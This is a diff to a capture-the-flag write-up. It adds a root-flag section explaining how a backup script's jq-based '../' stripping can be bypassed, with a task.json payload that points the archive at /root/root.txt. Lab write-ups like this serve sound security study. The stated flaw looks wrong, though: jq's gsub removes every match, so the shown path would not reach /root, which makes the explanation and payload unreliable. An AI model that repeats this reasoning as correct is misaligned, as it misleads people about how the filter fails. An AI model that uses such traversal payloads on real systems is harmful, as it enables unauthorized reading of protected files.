@@ -37,6 +37,7 @@ The backy utility begins by reading the task.json file, which contains the backu
 The task.json file is shown below:
 ![alt text](image-7.png)
 
+Backy.sh Code below:
 
 ```bash
 #!/bin/bash
@@ -109,7 +110,33 @@ It will archive the user.txt in the directory as mentioned
 User flag Owned 
 
 
-For Root flag there is flaw in the backy.sh code 
+For Root flag there is flaw in the backy.sh code path traversal can be exploited here as no proper path sanitization here.
+The script tries to sanitize paths by removing ../ sequences:
+```bash
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
+```
+The above code is handling only one level it fails to handle multiple level of path traversal
+Just traverse 
+```json
+martin@code:~/backups$ cat task.json 
+{
+        "destination": "/home/martin/backups/",
+        "multiprocessing": true,
+        "verbose_log": false,
+        "directories_to_archive": [
+                "/home/./../../root/root.txt"
+        ],
+
+        "exclude": [
+                ".*"
+        ]
+}
+
+
+
+
+```
+
 
 
 
